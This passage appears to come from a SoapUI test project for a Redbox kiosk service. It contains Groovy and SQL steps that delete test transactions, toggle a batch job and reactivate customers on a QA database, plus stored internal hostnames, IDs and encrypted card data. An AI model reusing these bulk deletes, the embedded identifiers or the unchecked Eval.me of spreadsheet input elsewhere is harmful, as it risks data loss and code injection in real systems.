	t.Customer_ID = :Customer_ID 
and 
	d.RF_ID = :barCode
Order by 1 desc</con:query><con:assertion type="JDBC Status" id="87502685-568a-4290-95ce-6cd3ce2be790" name="JDBC Status"/><con:assertion type="GroovyScriptAssertion" id="70812117-964b-4481-9237-de7655f7f43e" name="Script Assertion"><con:configuration><scriptText>def TransactionID = context.expand( '${GetTransactionID#ResponseAsXml#//Results[1]/ResultSet[1]/Row[1]/TRANSACTION_ID[1]}' );
def TransactionStatus = context.expand( '${GetTransactionID#ResponseAsXml#//Results[1]/ResultSet[1]/Row[1]/TRANSACTION_STATUS[1]}' );
log.info ("TransactionID:$TransactionID; TransactionStatus:$TransactionStatus");</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>KioskClient_ID</con:name><con:value>${DataSource#KioskID}</con:value></con:property><con:property><con:name>Customer_ID</con:name><con:value>${#TestCase#CustomerID}</con:value></con:property><con:property><con:name>barCode</con:name><con:value>${#TestCase#BarcodeForTnx}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="Check to run Return Step" id="53dbf4b7-bf3c-4ae3-a724-412aa92dcea3"><con:settings/><con:config><script>def previousFlag = context.expand( '${#TestCase#previousFlag}' )
def isRentOnly = context.expand( '${DataSource#IsRentOnly}' )
//log.info ('Rental Limit Flag : ' + isRentOnly);
//log.info ("isRentOnly:$isRentOnly; previousFlag:$previousFlag");
if (isRentOnly == '0' &amp;&amp; previousFlag == '1')
{
	log.info 'Calling Return';
	testRunner.gotoStepByName( "Return")
}
else
{
	testRunner.gotoStepByName( "CleanUp")
	log.info 'Going to DataSource Loop';
}
</script></con:config></con:testStep><con:testStep type="groovy" name="Return" id="6db92b13-e861-445d-9ee2-6a3b3a90efbe"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
testRunner.testCase.setPropertyValue("previousFlag",'0');
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");

//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
	//	assert runner.status != Status.FAILED : runner.reason
	
		if(tcStatus == "FAIL")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("CleanUp"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("CleanUp");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="jdbc" name="CleanUp" id="867b150c-21b3-4ebb-823a-a2e55287671c"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>DECLARE @firstSuccessTxn datetime2,
		@isNew_Customer int,
		@CustomerID CHAR(20),
		@fName  nvarchar(50),
		@lName nvarchar(50),
		@isBlackList int,
		@CStatus int,
		@CActive int
	SET @CustomerID=:CID
	SET @isNew_Customer = :isNewCustomer
	SET @FName = :FName
	SET @LName = :LName
	SET @isBlackList = :isBlackList
	SET @CStatus = :CStatus
	SET @CActive = :CActive
	
		
--Set new updated new customer back to be existing customer.
if (@isNew_Customer=1)
	BEGIN
	--Check if customer is new, customer firstsuccess transaction passed 4 hrs is existing.
	if not exists (
		select FirstSuccessTransaction,* from Customer 
		where Customer_ID=@CustomerID and 
		 FirstSuccessTransaction&lt;(DATEADD(hour,-4,getdate()))
		)

		BEGIN
			if exists (select FirstSuccessTransaction from Customer 
						where Customer_ID=@CustomerID and FirstSuccessTransaction is null
					  )
				BEGIN
					update Customer set FirstSuccessTransaction=GETDATE()where Customer_ID=@CustomerID
				END
				
			set @firstSuccessTxn= DATEADD(hour,-5,(select FirstSuccessTransaction from Customer where Customer_ID=@CustomerID))
			update Customer set FirstSuccessTransaction=@firstSuccessTxn where Customer_ID=@CustomerID
			
		END
	END
--blacklisted customer roll back
if(@isBlackList=1)	
	BEGIN
		delete from Blacklist where Pattern=(@fName+' '+@lName) or Pattern=(@lName+' '+@fName)
	END

--Suspended and deactivated customer roll back
if (@CStatus=2 or @CStatus=3 or @CActive=0)
	BEGIN
		update Customer set Status=1, Active=1 where Customer_ID=@CustomerID
	END</con:query><con:assertion type="Simple Contains" name="Contains" id="16139019-0cec-4d8d-b077-79af7b4b8b2f"><con:configuration><token>Results</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:properties><con:property><con:name>isNewCustomer</con:name><con:value>${DataSource#IsNewCustomer}</con:value></con:property><con:property><con:name>CID</con:name><con:value>${#TestCase#CustomerID}</con:value></con:property><con:property><con:name>FName</con:name><con:value>Redbox</con:value></con:property><con:property><con:name>LName</con:name><con:value>Server</con:value></con:property><con:property><con:name>isBlackList</con:name><con:value>${DataSource#IsBlacklist}</con:value></con:property><con:property><con:name>CStatus</con:name><con:value>${DataSource#CustomerStatus}</con:value></con:property><con:property><con:name>CActive</con:name><con:value>${DataSource#CustomerActive}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="091e5bf8-8f8a-4d48-b92f-9715c0e7ff21"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="ab642460-1634-405c-9d26-fa2f5ad86ad8"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799,122116,264389) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM TransactionDiscount WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799,122116,264389)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505")

testRunner.testCase.setPropertyValue("ScenarioCount", "0");</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1983233</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058317</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">53910701710929</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>ResvAuth PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>27</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>12/26/18-14:46:38.161</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>12/26/18-14:47:02.642</con:value></con:property><con:property><con:name>success</con:name><con:value xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></con:property><con:property><con:name>CustomerID</con:name><con:value>122116</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageType%22%3A+%22ResvAuth%22%2C%22MessageId%22%3A+%2247051cb3-8691-4d83-ae74-7b58fa2b24ae%22%2C%22EngineVersion%22%3A+%221.27.1.297%22%2C%22BundleVersion%22%3A+%222.27.1.65%22%2C%22KioskId%22%3A+1505%2C%22CreditCard%22%3A+%7B%22FirstName%22%3A+%22Redbox%22%2C%22LastName%22%3A+%22Server%22%2C%22Number%22%3A+%22kkTyOy89lJatgSC0KwYx0Foff1%2BaZewoaEULBunYKD9r7m57YY50NTgkAAXRvgWL7x1YRNV2fCwg9N74EZX4AzDuFdp85MM6%2BhAKJWkCDCGGiwQ0Id0v%2B0gDCL9NRouMno%2B8y7EBZ8AFTumRlYMl%2FcEYZUGqdAjRcNU1q5i2%2BqS9jDbOO99PwG6%2Bp8%2BXWpbpv5j6IFpW3rrQKRP2DisTxezXno6pCt1paWTG2zdv8SfiOL8tHttxTo7q6epPEF6qnlu%2FG9gSUUods3p01x76AnCb1DPckstykFxFMD2tuWJrdm2tpE1CXOTTuKzdONJn94gGdcoY6u5n4UsmLPPsHfO4RJ19ZB%2Bl8BgqnCODKXuC%2B6OiN%2FuSiKxdESZWYkqCmom4L1ZzARlaumVKSXLpkQmxBi8vGcAtn0v3Nd%2FpIQ5kHTAnbEShGouz%2FFiWFt3uejB0gMeCQN17nV9fE8WFLqkjwQxRoL2%2Bc7EuXhzsUxP52ZT13KTwgSDeL7VyoGieCgIyWHd0S2RLToiyPyWk4F%2BByGXH1g%2B1y13wRNm5olRIJW4MkZZ1RTY6n9InCTz0gYF6zAVO%2Fg25gslYk2rdYK2pKeDPrLNToI9%2F%2B8H76yqD2tqSTviCrf6FaOazYCGQkOuD%2BnxidtZCdiamGqONb0GEH%2Bu%2F5pubEIWH3pnIuZc%3D%22%2C%22PostalCode%22%3A+%2260181%22%2C%22ExpirationMonth%22%3A+%2212%22%2C%22ExpirationYear%22%3A+%2220%22%2C%22KeyId%22%3A+100002%2C%22CardId%22%3A+%22sPGLKvq8XSHpLaJoXq6C03yZewBi8HYY4QZZP%2BownFc%3D%22%2C%22LastFour%22%3A+%221217%22%2C%22CardType%22%3A+4%2C%22Track2%22%3A+%22IMehDga7BFnLDGDaDvq0qoQDbQ1iEoTTEWukW413fsUKdprLOvxYQDjgW6H071r6EzLygTdKCdZsxRcQpKTp2%2B1k4H3sd65Rscwi994CvloLhhgXMfAy4ey7UmaVFGNaJpgL2SBbKXJzjk1ybqXdQrVE6qzZx0Q4%2BAjeYTjv2dAlqTEQ7I599VnKiZGZ55Bz7VyDz3yzEKnS%2BHyCh04OWYKYyXzYVYXP6OgJdt8FSfhtBTqUMq2BBX5QK6kCuJxtu8YGhw1%2Fm4jqsiDTJV%2Fe2U7%2FCxhQywgyby88h1pUGDlaWEmgtwYk7k5AzVNxKaE984f8XEbPg%2FhQpeH0ROAUO2gS9mg4qZ3LEVwerwMdxu4vlevxClI7nRRHuGapsuHD8jdWPpdXX5UcLAm7J8ldSZ0zux4DElLkzV2NIP6phw%2FV1qkbQ%2BFWwlOq1nYJrt2yzpyw0Q%2BDNuZSOOUJuxzNjpXV37xHVZPqwbcInKb9yw9LPxTWSjM7V2FwPwMWWgnHr5SOpRtgXf%2B2MUFFM7%2FMmA2KCp2Wx5rO%2B7aeeYaWylAssIOHAnzBzkufbZ41MwMVgH5tG6pVJmGJIZZmypRCGMbkoN8Whti%2BBYJMPjuhNIKmnPyXNqs1Qa4iPBaWtPPY8g1q2oPlftSvyHqaI8YbHHBqIOWyDZ8e02rhgppIVF4%3D%22%7D%2C%22TransactionDate%22%3A+%7B%22theDate%22%3A+636814540215990000%2C%22dateTimeKind%22%3A+%22Unspecified%22%2C%22dateString%22%3A+%222018-12-26T14%3A47%3A01.0000599%22%7D%2C%22UseCredits%22%3A+%220%22%2C%22ReferenceNumber%22%3A+5648740%2C%22CustomerProfileNumber%22%3A+%2253910701710929%22%2C%22ShoppingCart%22%3A+%7B+%22Groups%22%3A+%5B++%7B%22GroupType%22+%3A+1%2C++%22Items%22+%3A+%5B%7B%22ProductId%22+%3A+1494%2C%22Barcode%22+%3A+%22000150505%22%2C%22VendStatus%22+%3A+28%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22DVD%22%2C%22MultiDisc%22+%3A+false%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+1.75%2C%22ExtraNight%22+%3A+1.75%2C%22NonReturn%22+%3A+28.00%2C%22Expiration%22+%3A+1.75%2C%22NonReturnDays%22+%3A+16%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+1.75%2C%22DefaultExtraNight%22+%3A+1.75%7D%2C%22BlurayUpsell%22+%3A+null%2C%22SourceType%22+%3A+1%7D%2C%7B%22ProductId%22+%3A+986%2C%22Barcode%22+%3A+%22000150501%22%2C%22VendStatus%22+%3A+0%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22DVD%22%2C%22MultiDisc%22+%3A+false%2C%22DiscNumber%22+%3A+null%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+1.75%2C%22ExtraNight%22+%3A+1.75%2C%22NonReturn%22+%3A+28.00%2C%22Expiration%22+%3A+1.75%2C%22NonReturnDays%22+%3A+16%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+1.75%2C%22DefaultExtraNight%22+%3A+1.75%7D%2C%22BlurayUpsell%22+%3A+null%2C%22SourceType%22+%3A+0%7D%2C%7B%22ProductId%22+%3A+400147%2C%22Barcode%22+%3A+%22000027376%22%2C%22VendStatus%22+%3A+0%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22Blu-ray%22%2C%22MultiDisc%22+%3A+false%2C%22DiscNumber%22+%3A+null%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+2.00%2C%22ExtraNight%22+%3A+2.00%2C%22NonReturn%22+%3A+32.00%2C%22Expiration%22+%3A+2.00%2C%22NonReturnDays%22+%3A+16%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+2.00%2C%22DefaultExtraNight%22+%3A+2.00%7D%2C%22BlurayUpsell%22+%3A+null%2C%22SourceType%22+%3A+0%7D%2C%7B%22ProductId%22+%3A+10578%2C%22Barcode%22+%3A+%22001505072%22%2C%22VendStatus%22+%3A+0%2C%22ProductFamily%22+%3A+%22Games%22%2C%22ProductType%22+%3A+%22Xbox+One%22%2C%22MultiDisc%22+%3A+true%2C%22DiscNumber%22+%3A+null%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+3.00%2C%22ExtraNight%22+%3A+3.00%2C%22NonReturn%22+%3A+66.00%2C%22Expiration%22+%3A+3.00%2C%22NonReturnDays%22+%3A+22%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+3.00%2C%22DefaultExtraNight%22+%3A+3.00%7D%2C%22BlurayUpsell%22+%3A+null%2C%22SourceType%22+%3A+0%7D%5D%2C+%22Totals%22+%3A+%7B+%22TaxRate%22+%3A+9.7500%2C+%22Subtotal%22+%3A+8.5%2C+%22DiscountedSubtotal%22+%3A+8.5%2C+%22TaxAmount%22+%3A+%220.82875%22%2C+%22GrandTotal%22+%3A+9.32875+%7D+%7D%5D%2C%22Discounts%22%3A+%5B%5D%7D%7D+</con:value></con:property><con:property><con:name>previousFlag</con:name><con:value>0</con:value></con:property><con:property><con:name>BarcodeForTnx</con:name><con:value>000150561</con:value></con:property><con:property><con:name>ScenarioCount</con:name><con:value>2</con:value></con:property><con:property><con:name>CardAccountId</con:name><con:value>8352069</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648740</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>a8906ad3-5a0b-464d-8fb3-271772092709</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>68c471ba-be89-425e-ad9e-976c3b1affaa</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f7024338-1c7e-4198-8ae0-9c735790cb08</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>072c6706-be42-4b1c-8c14-025e62dad7a0</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b1916369-e70a-4156-affa-2800b5d4d7a8</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>285bb1e3-1e56-440f-9884-1643df922e26</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>6a18a162-e8a6-4255-a06e-98f732861cdc</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>02f83716-1f7b-4c86-9ef1-f189493b0fa9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ff2a5376-b38a-4560-ab82-9588375b9210</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>a746bed6-3fa6-4a1f-a296-33a1efa41f37</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>14c979f8-0fc4-4491-b750-13457a75704a</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="8de0a1fc-f69a-4a5e-92d2-67173cb068af" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="Loyalty" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0" disabled="true"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="42ca485c-b50c-4c3c-9b9e-5a149a8df116"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="dfe65bf0-d422-44a5-8d16-972349b3964f"><con:settings/><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="Excel"><con:configuration><file>${projectDir}/KS-DataSource.xls</file><worksheet>Online</worksheet><cell>A2</cell><ignoreEmpty>false</ignoreEmpty><evaluateFormulas>false</evaluateFormulas></con:configuration></con:dataSource><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>IsOffline</con:property><con:property>LoyaltyFlag</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="28c42784-0a82-4091-9f09-6012749b1a2e"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("------------------------------START----------------------------------");
log.info ("Scenario No: $ScenarioNo");
log.info ("Scenario:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

